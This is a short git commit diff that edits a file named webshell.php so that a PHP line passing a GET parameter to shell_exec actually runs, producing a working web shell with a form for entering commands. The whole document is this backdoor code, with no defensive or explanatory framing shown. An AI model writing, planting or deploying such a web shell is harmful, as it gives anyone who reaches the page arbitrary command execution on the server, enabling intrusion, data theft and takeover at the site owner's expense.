1b099845bf9380b99d75277e1f681160ea1ae792
io0329 <126740281+io0329@users.noreply.github.com>
2024-07-15 23:33:31 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,8 +1,9 @@
 <?php
 $cmd = $_GET["cmd"]; if(!empty($cmd)){
+    $result = shell_exec($cmd);
 }
 ?>
-$result = shell_exec($cmd);
+
 <form method="GET">
 <input type="text" name="cmd"> <input type="submit" value="EXECUTE"> </form>
 <hr>
